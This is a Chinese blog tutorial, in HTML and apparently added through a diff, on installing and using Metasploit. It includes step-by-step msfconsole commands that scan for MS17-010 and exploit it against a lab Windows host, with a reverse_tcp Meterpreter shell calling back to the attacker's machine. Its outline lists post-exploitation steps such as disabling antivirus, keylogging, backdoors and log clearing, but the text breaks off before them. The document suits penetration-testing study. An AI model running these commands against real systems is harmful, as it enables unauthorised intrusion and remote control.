@@ -1,0 +1,1034 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="theme-color" content="#3367D6"/>
+  <link rel="apple-touch-icon" href="/icons-192.png">
+  <link rel="manifest" href="/manifest.json">
+  
+  <meta name="generator" content="Hexo 7.1.1">
+
+  
+    <meta name="description" content="Enjoy Your Wonderful Life!">
+  
+
+  
+
+  
+    <meta name="author" content="CoreYun">
+  
+
+  
+
+  
+
+  <title>Metasploit(MSF)工具的使用 | CoreYun`s Blog</title>
+
+  
+
+  
+    <link rel="shortcut icon" href="/images/yf.png">
+  
+
+  <!--mathjax latex数学公式显示支持-->
+  
+  
+
+  
+
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+</head>
+<body>
+  <div class="root-container">
+    
+<!-- header container -->
+<header class="header-container post">
+  
+    <div class="post-image" style="background-image: url(https://ak-d.tripcdn.com/images/0Z036424x8tzqydyo9BAD.jpg)"></div>
+  
+
+  <!-- navbar -->
+<nav class="navbar">
+  <div class="navbar-content">
+    <!-- logo -->
+    <div class="navbar-logo">
+      <a href="/">
+        
+          CoreYun`s Blog
+        
+      </a>
+    </div>
+    <!-- link -->
+    <div class="navbar-link">
+      <div class="navbar-btn">
+        <div></div>
+        <div></div>
+        <div></div>
+      </div>
+      <ul class="navbar-list">
+        
+          <li class="navbar-list-item"><a href="/">首页</a></li>
+        
+          <li class="navbar-list-item"><a href="/links">友链</a></li>
+        
+          <li class="navbar-list-item"><a href="/about">关于</a></li>
+        
+          <li class="navbar-list-item"><a href="/Resource">资源</a></li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+    <div class="header-content">
+      <div class="post-text layout-block">
+        <div class="layout-margin">
+          <h1 class="title-wrap">Metasploit(MSF)工具的使用</h1>
+          <h2 class="title-sub-wrap">
+            <strong>CoreYun</strong>
+            <span>发布于</span>
+            <time  class="article-date" datetime="2024-03-02T08:49:23.000Z" itemprop="datePublished">2024-03-02</time>
+          </h2>
+          
+            <h2 class="last-time">
+              <span>最后更新于</span>
+              <time  class="article-updated" datetime="2024-03-04T12:04:32.163Z" itemprop="dateUpdated">2024-03-04</time>
+            </h2>
+          
+          
+          <ul class="wrap-list dark">
+  
+</ul>
+          <ul class="wrap-list dark">
+  
+    <li><a href="/tags/%E5%B7%A5%E5%85%B7/">🏷️ 工具</a></li>
+  
+    <li><a href="/tags/%E6%8A%80%E6%9C%AF/">🏷️ 技术</a></li>
+  
+</ul>
+        </div>
+      </div>
+    </div>
+  
+
+  
+  
+  
+</header>
+
+    <!-- 文章 -->
+
+<!-- 文章内容 -->
+<div class="body-container">
+  <article class="content-container layout-block post-container">
+    <div class="article-info">
+      
+      
+      
+      
+      <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
+        <h2 id="文章目录"><a href="#文章目录" class="headerlink" title="文章目录"></a>文章目录</h2><ul>
+<li>实验环境</li>
+<li>简介</li>
+<li>Metasploit的安装和更新升级<ul>
+<li>一键安装MSF</li>
+<li>MSF的更新升级<ul>
+<li>非kali环境下更新升级MSF</li>
+<li>kali环境下更新升级MSF</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>使用方法<ul>
+<li>基础使用</li>
+<li>MSF中加载自定义的exploit模块</li>
+<li>漏洞利用(exploit)</li>
+<li>攻击载荷(payload)<ul>
+<li>payload模块路径</li>
+<li>Metasploit中的 Payload 模块主要有以下三种类型</li>
+</ul>
+</li>
+<li>Meterpreter<ul>
+<li>Meterpreter是如何工作的？</li>
+<li>Meterpreter的特点</li>
+</ul>
+</li>
+<li>MS17_010(永恒之蓝)<ul>
+<li>查找漏洞相关模块</li>
+<li>利用Auxiliary辅助探测模块对漏洞进行探测</li>
+<li>使用Exploit漏洞利用模块对漏洞进行利用</li>
+<li>Payload攻击载荷模块</li>
+</ul>
+</li>
+<li>后渗透阶段<ul>
+<li>Post后渗透模块</li>
+<li>查看主机是否运行在虚拟机上</li>
+<li>关闭杀毒软件</li>
+<li>获取目标主机的详细信息</li>
+<li>访问文件系统</li>
+<li>上传&#x2F;下载文件<ul>
+<li>下载文件</li>
+<li>上传文件</li>
+</ul>
+</li>
+<li>权限提升</li>
+<li>运行程序</li>
+<li>屏幕截图</li>
+<li>创建一个新账号</li>
+<li>启用远程桌面</li>
+<li>键盘记录</li>
+<li>进程迁移</li>
+<li>禁止目标主机使用键盘鼠标</li>
+<li>用目标主机摄像头拍照</li>
+<li>常用扩展库介绍<ul>
+<li>load&#x2F;use命令</li>
+<li>run命令</li>
+</ul>
+</li>
+<li>生成持续性后门<ul>
+<li>启动项启动</li>
+<li>服务启动</li>
+</ul>
+</li>
+<li>portfwd端口转发</li>
+<li>清除事件日志</li>
+</ul>
+</li>
+<li>导入并执行PowerShell脚本</li>
+<li>加载stdapi</li>
+<li>升级Session</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><blockquote>
+<p>Windows10-192.168.100.158</p>
+<p>KaliLinux-192.168.100.132</p>
+</blockquote>
+<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote>
+<p>Metasploit Framework(MSF)是一款开源安全漏洞检测工具，附带数千个已知的软件漏洞，并保持持续更新</p>
+<p>Metasploit可以用来信息收集、漏洞探测、漏洞利用等渗透测试的全流程，被安全社区冠以“可以黑掉整个宇宙”之名</p>
+<p>刚开始的Metasploit是采用Perl语言编写的，但是再后来的新版中，改成了用Ruby语言编写的了</p>
+</blockquote>
+<hr>
+<h2 id="Metasploit的安装和更新升级"><a href="#Metasploit的安装和更新升级" class="headerlink" title="Metasploit的安装和更新升级"></a>Metasploit的安装和更新升级</h2><h3 id="一键安装MSF"><a href="#一键安装MSF" class="headerlink" title="一键安装MSF"></a>一键安装MSF</h3><blockquote>
+<p>在一般的linux中，默认是不安装MSF的<br>以下是在非kali的Linux下安装MSF框架</p>
+</blockquote>
+<p>所需命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#一键安装MSF：</span></span><br><span class="line">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; <span class="built_in">chmod</span> 755 msfinstall &amp;&amp; ./msfinstall</span><br><span class="line"> </span><br><span class="line">adduser msf                           <span class="comment">#添加msf用户</span></span><br><span class="line">su msf                                <span class="comment">#切换到msf用户</span></span><br><span class="line"><span class="built_in">cd</span>  /opt/metasploit-framework/bin     <span class="comment">#切换到msf所在的目录 </span></span><br><span class="line">./msfconsole                          </span><br><span class="line"><span class="comment">#以后启动msfconsole，都切换到msf用户下启动，这样会同步数据库</span></span><br><span class="line"><span class="comment">#如果使用root用户启动的话，不会同步数据库  </span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#也可以将msfconsole加入到执行目录下，这样在任何目录直接msfconsole就可以了：</span></span><br><span class="line"><span class="built_in">ln</span> -s /opt/metasploit-framework/bin/msfconsole /usr/bin/msfconsole</span><br><span class="line"> </span><br><span class="line"><span class="comment">#备注：</span></span><br><span class="line"><span class="comment">#初次运行msf会创建数据库，但是msf默认使用的PostgreSQL数据库不能与root用户关联</span></span><br><span class="line"><span class="comment">#这也这也就是需要新建用户msf来运行metasploit的原因所在</span></span><br><span class="line"><span class="comment">#如果你一不小心手一抖，初次运行是在root用户下</span></span><br><span class="line"><span class="comment">#请使用 msfdb reinit 命令，然后使用非root用户初始化数据库     </span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 非kali环境下更新升级MSF：</span></span><br><span class="line">msfupdate			    <span class="comment"># MSF后期的升级</span></span><br><span class="line"><span class="comment"># kali环境下更新升级MSF：</span></span><br><span class="line">apt update 			    <span class="comment"># 更新安装包信息；只检查，不更新</span></span><br><span class="line">apt upgrade 			    <span class="comment"># 更新已安装的软件包，不删除旧包；</span></span><br><span class="line">apt full-upgrade		    <span class="comment"># 升级包，删除旧包</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="MSF的更新升级"><a href="#MSF的更新升级" class="headerlink" title="MSF的更新升级"></a>MSF的更新升级</h3><h4 id="非kali环境下更新升级MSF"><a href="#非kali环境下更新升级MSF" class="headerlink" title="非kali环境下更新升级MSF"></a>非kali环境下更新升级MSF</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfupdate  <span class="comment">#MSF后期更新升级</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="kali环境下更新升级MSF"><a href="#kali环境下更新升级MSF" class="headerlink" title="kali环境下更新升级MSF"></a>kali环境下更新升级MSF</h4><blockquote>
+<p>由于kali中的Metasploit渗透测试框架是集成在系统中的</p>
+<p>不是单独安装，不支持使用msfupdate命令更新</p>
+<p>更新的话需要随系统程序更新。</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt update 				<span class="comment"># 更新安装包信息</span></span><br><span class="line">apt upgrade 				<span class="comment"># 更新已安装的软件包，不删除旧包</span></span><br><span class="line">apt full-upgrade			<span class="comment"># 升级包，删除旧包</span></span><br></pre></td></tr></table></figure>
+<p>使用上面命令，是在更新系统程序的同时，把MSF更新</p>
+<hr>
+<h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><h4 id="基础使用"><a href="#基础使用" class="headerlink" title="基础使用"></a>基础使用</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msfconsole					        <span class="comment">#进入框架</span></span><br><span class="line">search  ms17_010                                        <span class="comment"># 使用search命令查找相关漏洞</span></span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue            <span class="comment"># 使用use进入模块</span></span><br><span class="line">info     	         	           		<span class="comment">#使用info查看模块信息</span></span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp    	<span class="comment">#设置攻击载荷</span></span><br><span class="line">show options    				        <span class="comment">#查看模块需要配置的参数</span></span><br><span class="line"><span class="built_in">set</span>  RHOST  192.168.1.xxx    				<span class="comment">#设置参数</span></span><br><span class="line">exploit / run     			                <span class="comment">#攻击</span></span><br></pre></td></tr></table></figure>
+<p>不同的攻击用到的步骤也不一样，这不是一成不变的，需要灵活使用<br>我们也可以将攻击代码写入configure.rc（只要是以.rc结尾的文件）配置文件中<br>然后使用命令 <strong>msfconsole -r configure.rc</strong> 进行自动攻击</p>
+<h4 id="MSF中加载自定义的exploit模块"><a href="#MSF中加载自定义的exploit模块" class="headerlink" title="MSF中加载自定义的exploit模块"></a>MSF中加载自定义的exploit模块</h4><blockquote>
+<p><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-0708">CVE-2019-0708 远程桌面漏洞复现</a></p>
+<p>该文中介绍了如果加载自定义的exploit模块并且成功攻击</p>
+</blockquote>
+<h4 id="漏洞利用-exploit"><a href="#漏洞利用-exploit" class="headerlink" title="漏洞利用(exploit)"></a>漏洞利用(exploit)</h4><blockquote>
+<p>漏洞利用exploit，也就是我们常说的exp，他就是对漏洞进行攻击的代码</p>
+</blockquote>
+<p>exploit漏洞利用模块路径(这里面有针对不同平台的exploit)：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/metasploit-framework/modules/exploits</span><br></pre></td></tr></table></figure>
+
+<h4 id="攻击载荷-Payload"><a href="#攻击载荷-Payload" class="headerlink" title="攻击载荷(Payload)"></a>攻击载荷(Payload)</h4><blockquote>
+<p>Payload：Payload中包含攻击进入目标主机后需要在远程系统中运行的恶意代码，而在Metasploit中Payload是一种特殊模块，它们能够以漏洞利用模块运行，并能够利用目标系统中的安全漏洞实施攻击。简而言之，这种漏洞利用模块可以访问目标系统，而其中的代码定义了Payload在目标系统中的行为</p>
+<p>Shellcode：Shellcode是payload中的精髓部分，在渗透攻击时作为攻击载荷运行的一组机器指令。Shellcode通常用汇编语言编写。在大多数情况下，目标系统执行了shellcode这一组指令之后，才会提供一个命令行shell</p>
+</blockquote>
+<h5 id="Payload模块路径"><a href="#Payload模块路径" class="headerlink" title="Payload模块路径"></a>Payload模块路径</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/metasploit-framework/modules/payloads</span><br></pre></td></tr></table></figure>
+
+<h5 id="Metasploit中的Payload模块主要有以下三种类型"><a href="#Metasploit中的Payload模块主要有以下三种类型" class="headerlink" title="Metasploit中的Payload模块主要有以下三种类型"></a>Metasploit中的Payload模块主要有以下三种类型</h5><blockquote>
+<p><strong>Single</strong>：<br>  是一种<strong>完全独立</strong>的<strong>Payload</strong>，而且使用起来就像运行<strong>calc.exe</strong>一样简单，例如添加一个系统用户或删除一份文件。由于<strong>Single Payload</strong>是完全独立的，因此它们有可能会被类似<strong>netcat</strong>这样的<strong>非metasploit</strong>处理工具所捕捉到</p>
+<p><strong>Stager</strong>：<br>  这种Payload<strong>负责建立目标用户与攻击者之间的网络连接</strong>，并下载额外的组件或应用程序。一种常见的<strong>Stager Payload</strong>就是<strong>reverse_tcp</strong>，它可以让<strong>目标系统与攻击者建立一条tcp连接</strong>，让<strong>目标系统主动连接我们的端口(反向连接)<strong>。另一种常见的是</strong>bind_tcp</strong>，它可以<strong>让目标系统开启一个tcp监听器，而攻击者随时可以与目标系统进行通信(正向连接)</strong></p>
+<p><strong>Stage</strong>：<br>  是<strong>Stager Payload</strong>下的一种<strong>Payload组件</strong>，这种Payload可以提供更加高级的功能，而且没有大小限制</p>
+</blockquote>
+<p>在Metasploit中，我们可以通过Payload的名称和使用格式来推断它的类型：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Single Payload的格式为：</span></span><br><span class="line">&lt;target&gt;/ &lt;single&gt;  如：windows/powershell_bind_tcp</span><br><span class="line"><span class="comment">#Stager/Stage Payload的格式为：</span></span><br><span class="line">&lt;target&gt;/ &lt;stage&gt; / &lt;stager&gt;  如：windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>当我们在Metasploit中执行 show payloads 命令之后，它会给我们显示一个可使用的Payload列表</p>
+</li>
+<li><p>注：<br>  在这个列表中，像 <strong>windows&#x2F;powershell_bind_tcp</strong> 就是一个 <strong>Single Payload</strong> ，它不包含 <strong>Stage Payload</strong><br>  而 <strong>windows&#x2F;meterpreter&#x2F;reverse_tcp</strong> 则由一个 <strong>Stage Payload（meterpreter）</strong> 和 一个 <strong>Stager Payload（reverse_tcp）</strong>组成<br>Stager中几种常见的payload：</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">windows/meterpreter/bind_tcp       <span class="comment">#正向连接</span></span><br><span class="line">windows/meterpreter/reverse_tcp    <span class="comment">#反向连接，常用</span></span><br><span class="line">windows/meterpreter/reverse_http   <span class="comment">#通过监听80端口反向连接</span></span><br><span class="line">windows/meterpreter/reverse_https  <span class="comment">#通过监听443端口反向连接</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>正向连接使用场景：<br>  我们的攻击机在内网环境，被攻击机是外网环境，由于被攻击机无法主动连接到我们的主机，所以就必须我们主动连接被攻击机了。但是这里经常遇到的问题是，被攻击机上开了防火墙，只允许访问指定的端口，比如被攻击机只对外开放了80端口。那么，我们就只能设置正向连接80端口了，这里很有可能失败，因为80端口上的流量太多了</p>
+</li>
+<li><p>反向连接使用场景：<br>  我们的主机和被攻击机都是在外网或者都是在内网，这样被攻击机就能主动连接到我们的主机了。如果是这样的情况，建议使用反向连接，因为反向连接的话，即使被攻击机开了防火墙也没事，防火墙只是阻止进入被攻击机的流量，而不会阻止被攻击机主动向外连接的流量</p>
+</li>
+<li><p>反向连接80和443端口使用场景：<br>  被攻击机能主动连接到我们的主机，还有就是被攻击机的防火墙设置的特别严格，就连被攻击机访问外部网络的流量也进行了严格的限制，只允许被攻击机的80端口或443端口与外部通信</p>
+</li>
+</ul>
+<h4 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a>Meterpreter</h4><blockquote>
+<p>Meterpreter属于stage payload，在Metasploit Framework中，Meterpreter是一种后渗透工具</p>
+<p>它属于一种在运行过程中可通过网络进行功能扩展的动态可扩展型Payload</p>
+<p>这种工具是基于“内存DLL注入”理念实现的</p>
+<p>它能够通过创建一个新进程并调用注入的DLL来让目标系统运行注入的DLL文件</p>
+</blockquote>
+<h5 id="Meterpreter是如何工作的？"><a href="#Meterpreter是如何工作的？" class="headerlink" title="Meterpreter是如何工作的？"></a>Meterpreter是如何工作的？</h5><blockquote>
+<p>首先目标先要执行初始的溢出漏洞会话连接，可能是bind正向连接，或者反弹reverse连接</p>
+<p>反射连接的时候加载dll链接文件，同时后台悄悄处理dll文件</p>
+<p>其次Meterpreter核心代码初始化,通过socket套接字建立一个TLS&#x2F;1.0加密隧道并发送GET请求给Metasploit服务端</p>
+<p>Metasploit服务端收到这个GET请求后就配置相应客户端</p>
+<p>最后，Meterpreter加载扩展，所有的扩展被加载都通过TLS&#x2F;1.0进行数据传输</p>
+</blockquote>
+<h5 id="Meterpreter的特点"><a href="#Meterpreter的特点" class="headerlink" title="Meterpreter的特点"></a>Meterpreter的特点</h5><blockquote>
+<ul>
+<li>Meterpreter完全驻留在内存，没有写入到磁盘</li>
+<li>Meterpreter注入的时候不会产生新的进程，并可以很容易的移植到其它正在运行的进程</li>
+<li>默认情况下， Meterpreter的通信是加密的，所以很安全</li>
+<li>扩展性，许多新的特征模块可以被加载<br>我们在设置payloads 时，可以将payloads设置为：windows&#x2F;meterpreter&#x2F;reverse_tcp<br>然后获得了 <strong>meterpreter&gt;</strong> 之后我们就可以干很多事了</li>
+</ul>
+</blockquote>
+<h5 id="MS17-010-永恒之蓝"><a href="#MS17-010-永恒之蓝" class="headerlink" title="MS17_010(永恒之蓝)"></a>MS17_010(永恒之蓝)</h5><blockquote>
+<p>模拟使用 MS17_010 漏洞攻击</p>
+<p>这个漏洞就是去年危害全球的勒索病毒利用的永恒之蓝漏洞</p>
+</blockquote>
+<h6 id="查找漏洞相关模块"><a href="#查找漏洞相关模块" class="headerlink" title="查找漏洞相关模块"></a>查找漏洞相关模块</h6><ol>
+<li>在kali命令行里面输入命令msfconsole，进入msf框架中</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole          <span class="comment">#输入这个命令主要是进入msf渗透框架中</span></span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>搜索MS17_010漏洞</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search ms17_010     <span class="comment">#利用search命令，搜索漏洞相关利用模块</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/./images/msf-1.png" alt="MSF-1" title="MSF-1"></p>
+<p>找到了四个模块，前三个是漏洞利用模块，后两个是辅助模块，主要探测主机是否存在MS17_010漏洞</p>
+<h6 id="利用Auxiliary辅助探测模块对漏洞进行探测"><a href="#利用Auxiliary辅助探测模块对漏洞进行探测" class="headerlink" title="利用Auxiliary辅助探测模块对漏洞进行探测"></a>利用Auxiliary辅助探测模块对漏洞进行探测</h6><blockquote>
+<p>Auxiliary辅助探测模块：</p>
+<p>  该模块不会直接在攻击机和靶机之间建立访问，它们只负责执行扫描，嗅探，指纹识别等相关功能以辅助渗透测试</p>
+</blockquote>
+<ol>
+<li>使用smb_ms17_010漏洞探测模块对smb_ms17_010漏洞进行探测</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_ms17_010</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>查看这个模块需要配置的信息</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options        <span class="comment">#查看这个模块需要配置的信息</span></span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>设置要探测的远程目标</li>
+</ol>
+<p><strong>注：RHOSTS 参数是要探测主机的ip或ip范围，我们探测一个ip范围内的主机是否存在漏洞</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> rhosts 192.168.100.100-192.168.100.190</span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li>对上面设置的ip范围内的主机进行攻击</li>
+</ol>
+<p><strong>注：有+号的就是可能存在漏洞的主机，这里有2个主机存在漏洞</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<h6 id="使用Exploit漏洞利用模块对漏洞进行利用"><a href="#使用Exploit漏洞利用模块对漏洞进行利用" class="headerlink" title="使用Exploit漏洞利用模块对漏洞进行利用"></a>使用Exploit漏洞利用模块对漏洞进行利用</h6><ol>
+<li>选择漏洞攻击模块，对漏洞进行利用</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>查看这个漏洞的信息</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">info：          <span class="comment">#查看这个漏洞的信息</span></span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>查看可攻击的系统平台，显示当前攻击模块针对哪些特定操作系统版本、语言版本的系统</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show targets  </span><br></pre></td></tr></table></figure>
+
+<p><strong>注：这里只有一个，有些其他的漏洞模块对操作系统的语言和版本要求的很严，比如MS08_067，这样就要我们指定目标系统的版本的</strong></p>
+<p><strong>如果不设置的话，MSF会自动帮我们判断目标操作系统的版本和语言</strong></p>
+<p><strong>(利用目标系统的指纹特征)</strong></p>
+<h6 id="Payload攻击载荷模块"><a href="#Payload攻击载荷模块" class="headerlink" title="Payload攻击载荷模块"></a>Payload攻击载荷模块</h6><blockquote>
+<p>攻击载荷是我们期望在目标系统在被渗透攻击之后完成的实际攻击功能的代码</p>
+<p>成功渗透目标后，用于在目标系统上运行任意命令 </p>
+</blockquote>
+<ol>
+<li>查看攻击载荷</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show  payloads  <span class="comment">#查看当前漏洞利用模块下可用的所有Payload</span></span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>设置攻击载荷</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>查看模块需要配置的参数</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show  options</span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li>设置攻击载荷参数</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> RHOST 192.168.100.158   <span class="comment">#设置RHOST，也就是要攻击主机的ip</span></span><br><span class="line"><span class="built_in">set</span> LHOST 192.168.100.132   <span class="comment">#设置LHOST，也就是我们主机的ip，用于接收从目标机弹回来的shell</span></span><br><span class="line"><span class="built_in">set</span> lport 6666              <span class="comment">#设置lport，也就是我们主机的端口，反弹shell到这个端口；如果我们这里不设置lport的话，默认是4444端口监听；</span></span><br></pre></td></tr></table></figure>
+
+<ol start="5">
+<li>进行攻击</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<h5 id="后渗透阶段"><a href="#后渗透阶段" class="headerlink" title="后渗透阶段"></a>后渗透阶段</h5><p>运行了exploit命令之后，我们开启了一个reverse TCP监听器来监听本地的6666端口</p>
+<p>即我（攻击者）的本地主机地址（LHOST）和端口号（LPORT）</p>
+<p>运行成功之后，我们将会看到命令提示符</p>
+<p><strong>meterpreter &gt;</strong></p>
+<p>Meterpreter的命令用法</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span 